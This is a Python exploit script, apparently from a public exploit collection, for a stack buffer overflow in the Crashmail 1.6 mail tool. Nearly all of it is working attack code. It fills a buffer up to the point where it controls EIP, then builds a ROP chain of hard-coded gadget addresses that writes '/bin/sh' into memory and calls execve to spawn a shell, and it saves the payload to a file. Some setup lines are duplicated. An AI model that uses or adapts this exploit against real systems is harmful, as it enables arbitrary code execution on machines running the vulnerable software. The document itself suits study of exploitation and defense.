# Exploit author: Juan Sacco <jsacco@exploitpack.com>
# Website: http://exploitpack.com
#
# Description: Crashmail is prone to a stack-based buffer overflow because the application fails to perform adequate boundary checks on user supplied input.
# Impact: An attacker could exploit this vulnerability to execute arbitrary code in the context of the application. Failed exploit attempts may result in a denial-of-service condition.
# Vendor homepage: http://ftnapps.sourceforge.net/crashmail.html
# Affected version: 1.6 ( Latest )

import os, subprocess
from struct import pack

p = lambda x : pack('I', x)
IMAGE_BASE_0 = 0x08048000 # ./crashmail
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

# Control of EIP at 216
# ROP chain: execve ( binsh )
# Static-linked
junk = 'A'*216 # Fill

from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # crashmail
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x000a5e36) # 0x080ede36: pop eax; ret;
rop += '//bi'
rop += rebase_0(0x0006c2da) # 0x080b42da: pop edx; ret;
rop += rebase_0(0x000e3060)
rop += rebase_0(0x00028e01) # 0x08070e01: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x000a5e36) # 0x080ede36: pop eax; ret;
rop += 'n/sh'
rop += rebase_0(0x0006c2da) # 0x080b42da: pop edx; ret;
rop += rebase_0(0x000e3064)
rop += rebase_0(0x00028e01) # 0x08070e01: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x00028963) # 0x08070963: xor eax, eax; ret;
rop += rebase_0(0x0006c2da) # 0x080b42da: pop edx; ret;
rop += rebase_0(0x000e3068)
rop += rebase_0(0x00028e01) # 0x08070e01: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x000001f1) # 0x080481f1: pop ebx; ret;
rop += rebase_0(0x000e3060)
rop += rebase_0(0x000caeb3) # 0x08112eb3: pop ecx; ret;
rop += rebase_0(0x000e3068)
rop += rebase_0(0x0006c2da) # 0x080b42da: pop edx; ret;
rop += rebase_0(0x000e3068)
rop += rebase_0(0x000a5e36) # 0x080ede36: pop eax; ret;
rop += p(0xfffffff5)
rop += rebase_0(0x0004e217) # 0x08096217: neg eax; ret;
rop += rebase_0(0x0006cba0) # 0x080b4ba0: int 0x80; ret;
evil_buffer = junk + rop

with open('exploit', 'wb') as f:
    f.write(evil_buffer)
